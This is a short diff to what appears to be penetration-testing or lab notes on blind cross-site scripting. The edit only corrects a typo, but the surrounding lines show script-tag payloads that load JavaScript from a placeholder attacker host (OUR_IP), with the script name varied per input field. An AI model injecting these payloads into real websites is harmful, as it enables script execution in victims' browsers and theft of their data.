@@ -20,7 +20,7 @@ Payloads:
 ```html
 <script src="http://OUR_IP/script.js"></script>
 ```
-Change the script name to the filed we are testing
+Change the script name to the field we are testing
 ```html
 <script src="http://OUR_IP/username"></script>
 ```
